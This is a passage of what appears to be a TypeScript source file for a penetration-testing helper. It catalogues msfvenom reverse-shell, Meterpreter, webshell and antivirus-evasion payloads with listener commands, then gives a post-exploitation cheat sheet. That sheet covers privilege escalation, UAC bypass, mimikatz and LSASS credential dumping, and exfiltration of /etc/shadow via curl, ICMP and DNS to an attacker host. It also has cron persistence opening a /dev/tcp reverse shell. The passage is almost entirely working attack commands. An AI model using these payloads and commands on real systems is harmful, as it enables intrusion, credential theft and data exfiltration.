    id: "win-x64-vncinject",
    category: "Windows EXE",
    label: "Windows x64 VNC Inject",
    platform: "windows",
    arch: "x64",
    format: "exe",
    output: "vncinject.exe",
    payload: "windows/x64/vncinject/reverse_tcp",
    notes:
      "Injects VNC server into target process — provides GUI access. Requires msf handler with VNC viewer.",
    mitre: ["T1021.005", "T1055"],
    staged: true,
    listener:
      "use exploit/multi/handler\nset payload windows/x64/vncinject/reverse_tcp\nset LHOST LHOST\nset LPORT LPORT\nrun",
  },
  // Windows DLL
  {
    id: "win-x64-dll",
    category: "Windows DLL",
    label: "Windows x64 DLL Shell",
    platform: "windows",
    arch: "x64",
    format: "dll",
    output: "shell.dll",
    payload: "windows/x64/shell_reverse_tcp",
    notes:
      "DLL for DLL hijacking or reflective injection. Use with rundll32 or custom loader.",
    mitre: ["T1574.001", "T1055.001"],
    staged: false,
    listener: "nc -lvnp LPORT",
  },
  {
    id: "win-x64-dll-meter",
    category: "Windows DLL",
    label: "Windows x64 Meterpreter DLL",
    platform: "windows",
    arch: "x64",
    format: "dll",
    output: "meter.dll",
    payload: "windows/x64/meterpreter_reverse_tcp",
    notes:
      "Stageless Meterpreter DLL — drop and load via rundll32 or reflective loader.",
    mitre: ["T1055.001", "T1574.001"],
    staged: false,
    listener:
      "use exploit/multi/handler\nset payload windows/x64/meterpreter_reverse_tcp\nset LHOST LHOST\nset LPORT LPORT\nrun",
  },
  {
    id: "win-x86-dll",
    category: "Windows DLL",
    label: "Windows x86 DLL Shell",
    platform: "windows",
    arch: "x86",
    format: "dll",
    output: "shell_x86.dll",
    payload: "windows/shell_reverse_tcp",
    notes:
      "32-bit DLL — for DLL hijacking in x86 processes (legacy apps and some services).",
    mitre: ["T1574.001", "T1055.001"],
    staged: false,
    listener: "nc -lvnp LPORT",
  },
  // Windows Script
  {
    id: "win-ps1",
    category: "Windows Script",
    label: "PowerShell Script (.ps1)",
    platform: "windows",
    arch: "x64",
    format: "ps1",
    output: "shell.ps1",
    payload: "windows/x64/shell_reverse_tcp",
    notes: "Execute with: powershell -ep bypass -f shell.ps1",
    mitre: ["T1059.001"],
    staged: false,
    listener: "nc -lvnp LPORT",
  },
  {
    id: "win-hta",
    category: "Windows Script",
    label: "HTA Application",
    platform: "windows",
    arch: "x64",
    format: "hta",
    output: "shell.hta",
    payload: "windows/x64/shell_reverse_tcp",
    notes:
      "HTML Application — opens with mshta.exe. Social engineering / phishing vector.",
    mitre: ["T1218.005"],
    staged: false,
    listener: "nc -lvnp LPORT",
  },
  {
    id: "win-vbs",
    category: "Windows Script",
    label: "VBScript Dropper",
    platform: "windows",
    arch: "x86",
    format: "vbs",
    output: "shell.vbs",
    payload: "windows/shell_reverse_tcp",
    notes:
      "VBScript — execute via wscript.exe or cscript.exe. Often used in phishing attachments.",
    mitre: ["T1059.005", "T1566.001"],
    staged: false,
    listener: "nc -lvnp LPORT",
  },
  {
    id: "win-aspx",
    category: "Windows Script",
    label: "ASP.NET ASPX Webshell",
    platform: "windows",
    arch: "x86",
    format: "aspx",
    output: "shell.aspx",
    payload: "windows/shell_reverse_tcp",
    notes:
      "ASPX web shell for IIS. Upload to writable web root, then browse to trigger.",
    mitre: ["T1505.003", "T1190"],
    staged: false,
    listener: "nc -lvnp LPORT",
  },
  {
    id: "win-asp",
    category: "Windows Script",
    label: "Classic ASP Webshell",
    platform: "windows",
    arch: "x86",
    format: "asp",
    output: "shell.asp",
    payload: "windows/shell_reverse_tcp",
    notes:
      "Classic ASP — older IIS servers. Check if ASP scripting is enabled.",
    mitre: ["T1505.003"],
    staged: false,
    listener: "nc -lvnp LPORT",
  },
  // Shellcode
  {
    id: "win-x64-raw-shellcode",
    category: "Shellcode",
    label: "Windows x64 Raw Shellcode (.bin)",
    platform: "windows",
    arch: "x64",
    format: "raw",
    output: "shellcode.bin",
    payload: "windows/x64/shell_reverse_tcp",
    notes:
      "Raw shellcode bytes — inject into target process memory. Use with custom loaders, exploits, or BOF.",
    mitre: ["T1055", "T1059.003"],
    staged: false,
    listener: "nc -lvnp LPORT",
  },
  {
    id: "win-x64-meter-raw",
    category: "Shellcode",
    label: "Windows x64 Meterpreter Shellcode",
    platform: "windows",
    arch: "x64",
    format: "raw",
    output: "meter_shellcode.bin",
    payload: "windows/x64/meterpreter_reverse_tcp",
    notes:
      "Stageless Meterpreter shellcode for process injection. Pipe to xxd for hex dump.",
    mitre: ["T1055", "T1059.001"],
    staged: false,
    listener:
      "use exploit/multi/handler\nset payload windows/x64/meterpreter_reverse_tcp\nset LHOST LHOST\nset LPORT LPORT\nrun",
  },
  {
    id: "win-x64-shellcode-c",
    category: "Shellcode",
    label: "Windows x64 Shellcode (C Format)",
    platform: "windows",
    arch: "x64",
    format: "c",
    output: "shellcode.c",
    payload: "windows/x64/shell_reverse_tcp",
    notes:
      "C-style shellcode array — paste directly into a C/C++ loader. Compile and inject.",
    mitre: ["T1055", "T1059.003"],
    staged: false,
    listener: "nc -lvnp LPORT",
  },
  {
    id: "win-x64-shellcode-python",
    category: "Shellcode",
    label: "Windows x64 Shellcode (Python)",
    platform: "windows",
    arch: "x64",
    format: "py",
    output: "shellcode.py",
    payload: "windows/x64/shell_reverse_tcp",
    notes:
      "Python-formatted shellcode — use with ctypes loader on Windows for process injection.",
    mitre: ["T1055", "T1059.006"],
    staged: false,
    listener: "nc -lvnp LPORT",
  },
  {
    id: "win-x86-raw-shellcode",
    category: "Shellcode",
    label: "Windows x86 Raw Shellcode",
    platform: "windows",
    arch: "x86",
    format: "raw",
    output: "shellcode_x86.bin",
    payload: "windows/shell_reverse_tcp",
    notes:
      "32-bit shellcode — use for buffer overflow PoCs and x86 process injection. Pair with bad-char analysis.",
    mitre: ["T1055", "T1203"],
    staged: false,
    listener: "nc -lvnp LPORT",
  },
  {
    id: "linux-x64-raw-shellcode",
    category: "Shellcode",
    label: "Linux x64 Raw Shellcode",
    platform: "linux",
    arch: "x64",
    format: "raw",
    output: "linux_shellcode.bin",
    payload: "linux/x64/shell_reverse_tcp",
    notes:
      "Linux x64 shellcode bytes for exploit PoCs or injection into Linux processes.",
    mitre: ["T1055", "T1203"],
    staged: false,
    listener: "nc -lvnp LPORT",
  },
  // Linux ELF
  {
    id: "linux-x64-shell-stageless",
    category: "Linux ELF",
    label: "Linux x64 Shell (Stageless)",
    platform: "linux",
    arch: "x64",
    format: "elf",
    output: "shell",
    payload: "linux/x64/shell_reverse_tcp",
    notes:
      "Stageless ELF binary. chmod +x then execute. Works on most modern Linux.",
    mitre: ["T1059.004"],
    staged: false,
    listener: "nc -lvnp LPORT",
  },
  {
    id: "linux-x64-meter-staged",
    category: "Linux ELF",
    label: "Linux x64 Meterpreter (Staged)",
    platform: "linux",
    arch: "x64",
    format: "elf",
    output: "meter",
    payload: "linux/x64/meterpreter/reverse_tcp",
    notes: "Full Meterpreter on Linux. Requires msf handler.",
    mitre: ["T1059.004"],
    staged: true,
    listener:
      "use exploit/multi/handler\nset payload linux/x64/meterpreter/reverse_tcp\nset LHOST LHOST\nset LPORT LPORT\nrun",
  },
  {
    id: "linux-x64-meter-stageless",
    category: "Linux ELF",
    label: "Linux x64 Meterpreter (Stageless)",
    platform: "linux",
    arch: "x64",
    format: "elf",
    output: "meter_sl",
    payload: "linux/x64/meterpreter_reverse_tcp",
    notes:
      "Stageless Meterpreter — larger binary but no handler staging needed.",
    mitre: ["T1059.004"],
    staged: false,
    listener:
      "use exploit/multi/handler\nset payload linux/x64/meterpreter_reverse_tcp\nset LHOST LHOST\nset LPORT LPORT\nrun",
  },
  {
    id: "linux-x64-bind",
    category: "Linux ELF",
    label: "Linux x64 Bind Shell",
    platform: "linux",
    arch: "x64",
    format: "elf",
    output: "bind_shell",
    payload: "linux/x64/shell/bind_tcp",
    notes:
      "Linux bind shell — target listens on port, attacker connects. Use when outbound is blocked.",
    mitre: ["T1059.004"],
    staged: true,
    listener: "nc LHOST LPORT",
  },
  {
    id: "linux-x86-shell",
    category: "Linux ELF",
    label: "Linux x86 Shell",
    platform: "linux",
    arch: "x86",
    format: "elf",
    output: "shell_x86",
    payload: "linux/x86/shell_reverse_tcp",
    notes: "32-bit Linux ELF. Use when target is 32-bit or unknown arch.",
    mitre: ["T1059.004"],
    staged: false,
    listener: "nc -lvnp LPORT",
  },
  {
    id: "linux-arm-shell",
    category: "Linux ELF",
    label: "Linux ARM Shell (armle)",
    platform: "linux",
    arch: "armle",
    format: "elf",
    output: "shell_arm",
    payload: "linux/armle/shell_reverse_tcp",
    notes: "ARM little-endian — IoT devices, Raspberry Pi, embedded systems.",
    mitre: ["T1059.004"],
    staged: false,
    listener: "nc -lvnp LPORT",
  },
  {
    id: "linux-arm64-meter",
    category: "Linux ELF",
    label: "Linux ARM64 Meterpreter",
    platform: "linux",
    arch: "aarch64",
    format: "elf",
    output: "meter_arm64",
    payload: "linux/aarch64/meterpreter_reverse_tcp",
    notes:
      "ARM64 — modern IoT, Apple Silicon VMs, cloud ARM instances (AWS Graviton).",
    mitre: ["T1059.004"],
    staged: false,
    listener:
      "use exploit/multi/handler\nset payload linux/aarch64/meterpreter_reverse_tcp\nset LHOST LHOST\nset LPORT LPORT\nrun",
  },
  {
    id: "linux-mips-shell",
    category: "Linux ELF",
    label: "Linux MIPS Shell (mipsle)",
    platform: "linux",
    arch: "mipsle",
    format: "elf",
    output: "shell_mips",
    payload: "linux/mipsle/shell_reverse_tcp",
    notes:
      "MIPS little-endian — routers, network devices, embedded Linux. Common on consumer routers.",
    mitre: ["T1059.004"],
    staged: false,
    listener: "nc -lvnp LPORT",
  },
  {
    id: "linux-ppc-shell",
    category: "Linux ELF",
    label: "Linux PPC Shell",
    platform: "linux",
    arch: "ppc",
    format: "elf",
    output: "shell_ppc",
    payload: "linux/ppc/shell_reverse_tcp",
    notes: "PowerPC — legacy systems, some embedded Linux.",
    mitre: ["T1059.004"],
    staged: false,
    listener: "nc -lvnp LPORT",
  },
  // macOS
  {
    id: "macos-x64-shell",
    category: "macOS",
    label: "macOS x64 Shell",
    platform: "osx",
    arch: "x64",
    format: "macho",
    output: "shell_macos",
    payload: "osx/x64/shell_reverse_tcp",
    notes:
      "Mach-O binary for macOS. May require codesign bypass or Gatekeeper disable.",
    mitre: ["T1059.004"],
    staged: false,
    listener: "nc -lvnp LPORT",
  },
  {
    id: "macos-x64-meter",
    category: "macOS",
    label: "macOS x64 Meterpreter",
    platform: "osx",
    arch: "x64",
    format: "macho",
    output: "meter_macos",
    payload: "osx/x64/meterpreter_reverse_tcp",
    notes: "Meterpreter on macOS. Requires msf handler.",
    mitre: ["T1059.004"],
    staged: true,
    listener:
      "use exploit/multi/handler\nset payload osx/x64/meterpreter_reverse_tcp\nset LHOST LHOST\nset LPORT LPORT\nrun",
  },
  {
    id: "macos-arm64-shell",
    category: "macOS",
    label: "macOS ARM64 (Apple Silicon)",
    platform: "osx",
    arch: "aarch64",
    format: "macho",
    output: "shell_arm64_macos",
    payload: "osx/aarch64/shell_reverse_tcp",
    notes:
      "Apple Silicon (M1/M2/M3) native binary. x64 also works via Rosetta.",
    mitre: ["T1059.004"],
    staged: false,
    listener: "nc -lvnp LPORT",
  },
  {
    id: "macos-x64-meter-https",
    category: "macOS",
    label: "macOS x64 Meterpreter HTTPS",
    platform: "osx",
    arch: "x64",
    format: "macho",
    output: "meter_macos_https",
    payload: "osx/x64/meterpreter/reverse_https",
    notes:
      "HTTPS Meterpreter on macOS — encrypted C2. Port 443 blends with normal web traffic.",
    mitre: ["T1059.004", "T1573.001"],
    staged: true,
    listener:
      "use exploit/multi/handler\nset payload osx/x64/meterpreter/reverse_https\nset LHOST LHOST\nset LPORT LPORT\nrun",
  },
  // Android
  {
    id: "android-meter",
    category: "Android APK",
    label: "Android Meterpreter (TCP)",
    platform: "android",
    arch: "dalvik",
    format: "apk",
    output: "shell.apk",
    payload: "android/meterpreter/reverse_tcp",
    notes:
      "APK with embedded Meterpreter. Install with: adb install shell.apk. Requires msf handler.",
    mitre: ["T1476", "T1444"],
    staged: true,
    listener:
      "use exploit/multi/handler\nset payload android/meterpreter/reverse_tcp\nset LHOST LHOST\nset LPORT LPORT\nrun",
  },
  {
    id: "android-meter-https",
    category: "Android APK",
    label: "Android Meterpreter (HTTPS)",
    platform: "android",
    arch: "dalvik",
    format: "apk",
    output: "shell_https.apk",
    payload: "android/meterpreter/reverse_https",
    notes:
      "HTTPS Meterpreter on Android — encrypted C2. Harder to detect on network.",
    mitre: ["T1476", "T1573.001"],
    staged: true,
    listener:
      "use exploit/multi/handler\nset payload android/meterpreter/reverse_https\nset LHOST LHOST\nset LPORT LPORT\nrun",
  },
  {
    id: "android-shell",
    category: "Android APK",
    label: "Android Shell (Stageless)",
    platform: "android",
    arch: "dalvik",
    format: "apk",
    output: "shell_android.apk",
    payload: "android/shell/reverse_tcp",
    notes:
      "Simple Android reverse shell. No full Meterpreter. nc listener works.",
    mitre: ["T1476"],
    staged: false,
    listener: "nc -lvnp LPORT",
  },
  // Web Payloads
  {
    id: "php-reverse",
    category: "Web Payload",
    label: "PHP Reverse Shell",
    platform: "php",
    arch: "php",
    format: "raw",
    output: "shell.php",
    payload: "php/reverse_php",
    notes:
      "PHP reverse shell script. Upload via file upload vuln, then visit the URL.",
    mitre: ["T1505.003"],
    staged: false,
    listener: "nc -lvnp LPORT",
  },
  {
    id: "php-meter",
    category: "Web Payload",
    label: "PHP Meterpreter (Stageless)",
    platform: "php",
    arch: "php",
    format: "raw",
    output: "meter.php",
    payload: "php/meterpreter_reverse_tcp",
    notes:
      "PHP Meterpreter — full feature set via PHP interpreter. Runs on any PHP host.",
    mitre: ["T1505.003"],
    staged: false,
    listener:
      "use exploit/multi/handler\nset payload php/meterpreter_reverse_tcp\nset LHOST LHOST\nset LPORT LPORT\nrun",
  },
  {
    id: "jsp-shell",
    category: "Web Payload",
    label: "JSP Reverse Shell",
    platform: "java",
    arch: "java",
    format: "jsp",
    output: "shell.jsp",
    payload: "java/jsp_shell_reverse_tcp",
    notes:
      "Java Server Pages shell. Deploy on Tomcat/JBoss/WebLogic via upload or WAR.",
    mitre: ["T1505.003"],
    staged: false,
    listener: "nc -lvnp LPORT",
  },
  {
    id: "war-shell",
    category: "Web Payload",
    label: "WAR Reverse Shell (Tomcat)",
    platform: "java",
    arch: "java",
    format: "war",
    output: "shell.war",
    payload: "java/jsp_shell_reverse_tcp",
    notes:
      "WAR archive for Tomcat manager deploy. Auto-deploys JSP shell on upload.",
    mitre: ["T1505.003"],
    staged: false,
    listener: "nc -lvnp LPORT",
  },
  {
    id: "java-meter",
    category: "Web Payload",
    label: "Java Meterpreter (JAR)",
    platform: "java",
    arch: "java",
    format: "jar",
    output: "meter.jar",
    payload: "java/meterpreter/reverse_tcp",
    notes:
      "Java Meterpreter JAR — execute with: java -jar meter.jar. Cross-platform.",
    mitre: ["T1059.007"],
    staged: true,
    listener:
      "use exploit/multi/handler\nset payload java/meterpreter/reverse_tcp\nset LHOST LHOST\nset LPORT LPORT\nrun",
  },
  {
    id: "python-meter",
    category: "Web Payload",
    label: "Python Meterpreter Script",
    platform: "python",
    arch: "python",
    format: "raw",
    output: "meter.py",
    payload: "python/meterpreter_reverse_tcp",
    notes:
      "Python Meterpreter script — runs on any Python 2/3 host. Execute with: python meter.py",
    mitre: ["T1059.006"],
    staged: false,
    listener:
      "use exploit/multi/handler\nset payload python/meterpreter_reverse_tcp\nset LHOST LHOST\nset LPORT LPORT\nrun",
  },
  // Evasion
  {
    id: "win-x64-encoded",
    category: "Evasion",
    label: "x64 Shikata Ga Nai Encoded",
    platform: "windows",
    arch: "x64",
    format: "exe",
    output: "shell_enc.exe",
    payload: "windows/x64/shell_reverse_tcp",
    notes:
      "Polymorphic XOR additive feedback encoder — bypasses basic AV signatures. Add -x with a legit binary to embed.",
    mitre: ["T1027", "T1059.003"],
    staged: false,
    listener: "nc -lvnp LPORT",
  },
  {
    id: "win-x64-xor-encoded",
    category: "Evasion",
    label: "x64 XOR Dynamic Encoded",
    platform: "windows",
    arch: "x64",
    format: "exe",
    output: "xor_shell.exe",
    payload: "windows/x64/shell_reverse_tcp",
    notes:
      "XOR dynamic encoder — polymorphic output, different on each generation. Good for bypassing static signatures.",
    mitre: ["T1027", "T1059.003"],
    staged: false,
    listener: "nc -lvnp LPORT",
  },
  {
    id: "win-x64-template",
    category: "Evasion",
    label: "x64 Template Inject (notepad)",
    platform: "windows",
    arch: "x64",
    format: "exe",
    output: "notepad_shell.exe",
    payload: "windows/x64/meterpreter_reverse_tcp",
    notes:
      "Inject into legitimate EXE template with -x notepad.exe — binary appears legitimate to casual inspection.",
    mitre: ["T1027", "T1036.005"],
    staged: false,
    listener:
      "use exploit/multi/handler\nset payload windows/x64/meterpreter_reverse_tcp\nset LHOST LHOST\nset LPORT LPORT\nrun",
  },
  {
    id: "win-x64-no-null",
    category: "Evasion",
    label: "x64 No-Null Shellcode",
    platform: "windows",
    arch: "x64",
    format: "raw",
    output: "nonull_shellcode.bin",
    payload: "windows/x64/shell_reverse_tcp",
    notes:
      "Avoids null bytes (\\x00) for exploit dev — add -b '\\x00' to msfvenom command when string terminators are an issue.",
    mitre: ["T1027", "T1203"],
    staged: false,
    listener: "nc -lvnp LPORT",
  },
  // iOS
  {
    id: "ios-meter-tcp",
    category: "iOS",
    label: "iOS Meterpreter (TCP)",
    platform: "apple_ios",
    arch: "aarch64",
    format: "macho",
    output: "meter_ios",
    payload: "apple_ios/aarch64/meterpreter_reverse_tcp",
    notes:
      "iOS Meterpreter — requires jailbroken device. Deploy via Cydia or sideload.",
    mitre: ["T1476", "T1444"],
    staged: false,
    listener:
      "use exploit/multi/handler\nset payload apple_ios/aarch64/meterpreter_reverse_tcp\nset LHOST LHOST\nset LPORT LPORT\nrun",
  },
  // BSD
  {
    id: "freebsd-x64-shell",
    category: "BSD",
    label: "FreeBSD x64 Shell",
    platform: "bsd",
    arch: "x64",
    format: "elf",
    output: "shell_freebsd",
    payload: "bsd/x64/shell_reverse_tcp",
    notes:
      "FreeBSD x64 — common on network appliances, firewalls (pfSense, OPNsense).",
    mitre: ["T1059.004"],
    staged: false,
    listener: "nc -lvnp LPORT",
  },
  {
    id: "bsdx86-shell",
    category: "BSD",
    label: "BSD x86 Shell",
    platform: "bsd",
    arch: "x86",
    format: "elf",
    output: "shell_bsd_x86",
    payload: "bsd/x86/shell_reverse_tcp",
    notes: "Generic x86 BSD — covers OpenBSD, NetBSD, older FreeBSD.",
    mitre: ["T1059.004"],
    staged: false,
    listener: "nc -lvnp LPORT",
  },
  // Network / SCADA
  {
    id: "solaris-x86-shell",
    category: "Network / SCADA",
    label: "Solaris x86 Shell",
    platform: "solaris",
    arch: "x86",
    format: "elf",
    output: "shell_solaris_x86",
    payload: "solaris/x86/shell_reverse_tcp",
    notes:
      "Solaris x86 — used in Oracle enterprise environments, legacy data centers.",
    mitre: ["T1059.004"],
    staged: false,
    listener: "nc -lvnp LPORT",
  },
  {
    id: "mainframe-shell",
    category: "Network / SCADA",
    label: "Solaris SPARC Shell",
    platform: "solaris",
    arch: "sparc",
    format: "elf",
    output: "shell_sparc",
    payload: "solaris/sparc/shell_reverse_tcp",
    notes:
      "Solaris SPARC ELF — legacy mainframes and enterprise Unix. Rare target but high-value.",
    mitre: ["T1059.004"],
    staged: false,
    listener: "nc -lvnp LPORT",
  },
];

const MSF_CATEGORIES = [...new Set(MSF_PAYLOADS.map((p) => p.category))];
const COMMON_PORTS: number[] = [443, 80, 4444, 8080, 1337, 9001, 31337, 6666];

// ─── Post-Exploitation Cheat Sheet ───────────────────────────────────────────
const POSTEX_SECTIONS = [
  {
    id: "enum-linux",
    label: "Linux Enumeration",
    icon: "🐧",
    commands: [
      { label: "Whoami + context", cmd: "id; whoami; hostname; uname -a" },
      { label: "Network interfaces", cmd: "ip a; ip route; cat /etc/hosts" },
      {
        label: "Open ports (internal)",
        cmd: "ss -tlnp; netstat -tlnp 2>/dev/null",
      },
      { label: "Running processes", cmd: "ps auxf" },
      {
        label: "Cron jobs (all users)",
        cmd: "cat /etc/cron* /etc/at* /var/spool/cron/crontabs/* 2>/dev/null",
      },
      { label: "SUID binaries", cmd: "find / -perm -4000 -type f 2>/dev/null" },
      { label: "GUID binaries", cmd: "find / -perm -2000 -type f 2>/dev/null" },
      {
        label: "World-writable files",
        cmd: "find / -writable -type f 2>/dev/null | grep -v proc",
      },
      {
        label: "Sensitive files",
        cmd: "find / -name '*.txt' -o -name '*.conf' -o -name '*.cfg' -o -name 'id_rsa*' 2>/dev/null | grep -v proc",
      },
      {
        label: "Password files",
        cmd: "cat /etc/passwd; cat /etc/shadow 2>/dev/null",
      },
      { label: "Sudo privileges", cmd: "sudo -l" },
      { label: "Installed packages (deb)", cmd: "dpkg -l" },
      { label: "Installed packages (rpm)", cmd: "rpm -qa" },
      { label: "Environment variables", cmd: "env; printenv" },
      { label: "Capabilities", cmd: "getcap -r / 2>/dev/null" },
    ],
  },
  {
    id: "enum-win",
    label: "Windows Enumeration",
    icon: "🪟",
    commands: [
      { label: "Whoami + context", cmd: "whoami /all" },
      { label: "System info", cmd: "systeminfo" },
      {
        label: "Network config",
        cmd: "ipconfig /all; route print; netstat -ano",
      },
      { label: "ARP cache", cmd: "arp -a" },
      { label: "Firewall rules", cmd: "netsh advfirewall show allprofiles" },
      { label: "Processes", cmd: "tasklist /v" },
      { label: "Services", cmd: "sc query; net start" },
      { label: "Scheduled tasks", cmd: "schtasks /query /fo LIST /v" },
      {
        label: "Local users + groups",
        cmd: "net user; net localgroup administrators",
      },
      { label: "Domain info", cmd: "net user /domain; net group /domain" },
      {
        label: "Installed software",
        cmd: `reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s`,
      },
      { label: "Stored creds (cmdkey)", cmd: "cmdkey /list" },
      {
        label: "SAM registry hive",
        cmd: `reg save HKLM\\SAM C:\\Temp\\sam.hive && reg save HKLM\\SYSTEM C:\\Temp\\system.hive`,
      },
      {
        label: "AlwaysInstallElevated",
        cmd: `reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated`,
      },
      {
        label: "Unquoted service paths",
        cmd: `wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\\Windows\\"`,
      },
      {
        label: "PowerShell history",
        cmd: `type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt`,
      },
    ],
  },
  {
    id: "privesc-linux",
    label: "Linux PrivEsc",
    icon: "⬆",
    commands: [
      {
        label: "Check GTFOBins (sudo)",
        cmd: "sudo -l  # then check https://gtfobins.github.io",
      },
      {
        label: "Writable /etc/passwd",
        cmd: `echo 'pwned::0:0:root:/root:/bin/bash' >> /etc/passwd && su pwned`,
      },
      {
        label: "Writable /etc/shadow",
        cmd: "openssl passwd -1 -salt abc password123  # paste hash into /etc/shadow for root",
      },
      { label: "SUID bash exploit", cmd: "bash -p  # if bash is SUID" },
      {
        label: "Python SUID escape",
        cmd: "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'  # if python SUID",
      },
      {
        label: "Wildcard injection (tar)",
        cmd: "touch /tmp/--checkpoint=1 /tmp/--checkpoint-action=exec=sh\\ shell.sh",
      },
      {
        label: "LD_PRELOAD abuse",
        cmd: '# If sudo LD_PRELOAD allowed: compile shared lib calling setuid(0)+system("/bin/bash") and LD_PRELOAD=./evil.so sudo <cmd>',
      },
      {
        label: "Docker socket escape",
        cmd: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
      },
      {
        label: "LXD container escape",
        cmd: "lxc init ubuntu:18.04 privesc -c security.privileged=true; lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true; lxc start privesc; lxc exec privesc /bin/sh",
      },
      {
        label: "LinPEAS (download+run)",
        cmd: "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
      },
    ],
  },
  {
    id: "privesc-win",
    label: "Windows PrivEsc",
    icon: "⬆",
    commands: [
      {
        label: "WinPEAS (download+run)",
        cmd: `powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe')"`,
      },
      {
        label: "PowerUp (check misconfigs)",
        cmd: `powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"`,
      },
      {
        label: "Token impersonation check",
        cmd: "whoami /priv  # look for SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege",
      },
      {
        label: "PrintSpoofer (SeImpersonate)",
        cmd: `.\PrintSpoofer.exe -i -c cmd`,
      },
      {
        label: "GodPotato (SeImpersonate)",
        cmd: `.\GodPotato.exe -cmd "cmd /c whoami"`,
      },
      {
        label: "Bypass UAC (fodhelper)",
        cmd: `New-Item HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command -Value "cmd.exe" -Force; New-ItemProperty HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command -Name DelegateExecute -Value "" -Force; Start-Process fodhelper.exe`,
      },
      {
        label: "AlwaysInstallElevated",
        cmd: `msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o evil.msi && msiexec /quiet /qn /i evil.msi`,
      },
      {
        label: "Unquoted service path exploit",
        cmd: "# Copy payload to vulnerable path then restart service:\nsc stop VulnService && sc start VulnService",
      },
      {
        label: "Credential Manager dump",
        cmd: `cmdkey /list; rundll32 keymgr.dll,KRShowKeyMgr`,
      },
      {
        label: "Pass-the-Hash (psexec)",
        cmd: "impacket-psexec -hashes :NTLM_HASH administrator@TARGET_IP",
      },
    ],
  },
  {
    id: "lateral",
    label: "Lateral Movement",
    icon: "↔",
    commands: [
      {
        label: "SMB psexec (Impacket)",
        cmd: "impacket-psexec domain/user:password@TARGET",
      },
      {
        label: "SMB psexec (hash)",
        cmd: "impacket-psexec -hashes :NTLMHASH domain/user@TARGET",
      },
      {
        label: "WMIexec (Impacket)",
        cmd: "impacket-wmiexec domain/user:password@TARGET",
      },
      {
        label: "SMBexec (Impacket)",
        cmd: "impacket-smbexec domain/user:password@TARGET",
      },
      {
        label: "CrackMapExec (spray)",
        cmd: "crackmapexec smb SUBNET/24 -u user -p password",
      },
      {
        label: "CrackMapExec (hash)",
        cmd: "crackmapexec smb TARGET -u user -H NTLMHASH --local-auth",
      },
      { label: "Evil-WinRM", cmd: "evil-winrm -i TARGET -u user -p password" },
      { label: "SSH (key forward)", cmd: "ssh -A -i id_rsa user@TARGET" },
      {
        label: "SSH tunnel (SOCKS5)",
        cmd: "ssh -D 1080 -N -f user@PIVOT_HOST",
      },
      {
        label: "Chisel tunnel (client)",
        cmd: "./chisel client LHOST:PORT R:socks",
      },
      {
        label: "Chisel tunnel (server)",
        cmd: "./chisel server --reverse --port PORT",
      },
      {
        label: "ProxyChains config",
        cmd: `echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf && proxychains nmap -sT TARGET`,
      },
    ],
  },
  {
    id: "creds",
    label: "Credential Dumping",
    icon: "🔑",
    commands: [
      {
        label: "Mimikatz (sekurlsa)",
        cmd: `privilege::debug\nsekurlsa::logonpasswords`,
      },
      { label: "Mimikatz (SAM dump)", cmd: `privilege::debug\nlsadump::sam` },
      {
        label: "Mimikatz (DCSync)",
        cmd: `privilege::debug\nlsadump::dcsync /domain:DOMAIN /user:krbtgt`,
      },
      {
        label: "Secretsdump (Impacket)",
        cmd: "impacket-secretsdump domain/user:password@TARGET",
      },
      {
        label: "NTDS.dit (local)",
        cmd: `ntdsutil "activate instance ntds" "ifm" "create full C:\\Temp\\ntds" quit quit`,
      },
      { label: "LaZagne (all creds)", cmd: `.\lazagne.exe all` },
      { label: "Firefox creds", cmd: `.\lazagne.exe browsers -firefox` },
      {
        label: "Proc dump LSASS",
        cmd: `procdump.exe -accepteula -ma lsass.exe C:\\Temp\\lsass.dmp`,
      },
      { label: "Pypykatz (offline)", cmd: "pypykatz lsa minidump lsass.dmp" },
      {
        label: "/etc/passwd + shadow",
        cmd: "unshadow /etc/passwd /etc/shadow > hashes.txt && hashcat -m 1800 hashes.txt wordlist.txt",
      },
    ],
  },
  {
    id: "exfil",
    label: "Exfiltration / Transfer",
    icon: "📦",
    commands: [
      { label: "Python HTTP server", cmd: "python3 -m http.server 80" },
      { label: "SCP to attacker", cmd: "scp -i id_rsa file user@LHOST:/tmp/" },
      {
        label: "Netcat file send",
        cmd: "# Receiver: nc -lvnp PORT > file.out\n# Sender:   nc LHOST PORT < file.in",
      },
      {
        label: "Base64 exfil",
        cmd: "base64 -w 0 /etc/shadow | curl -d @- http://LHOST/exfil",
      },
      {
        label: "Tar over SSH",
        cmd: "tar czf - /sensitive/dir | ssh user@LHOST 'cat > loot.tar.gz'",
      },
      {
        label: "PowerShell upload",
        cmd: `(New-Object Net.WebClient).UploadFile('http://LHOST/upload', 'C:\\path\\to\\file')`,
      },
      {
        label: "certutil b64 encode",
        cmd: "certutil -encode inputfile output.b64",
      },
      {
        label: "ICMP exfil (ping)",
        cmd: "for byte in $(xxd -p secret.txt); do ping -c 1 -p $byte LHOST; done",
      },
      {
        label: "DNS exfil",
        cmd: "cat secret.txt | xxd -p | while read line; do nslookup $line.domain.LHOST; done",
      },
    ],
  },
  {
    id: "persistence-linux",
    label: "Linux Persistence",
    icon: "🔒",
    commands: [
      {
        label: "Cron (every minute)",
        cmd: `echo "* * * * * /bin/bash -i >& /dev/tcp/LHOST/LPORT 0>&1" | crontab -`,
      },
      {
        label: "Cron (root)",
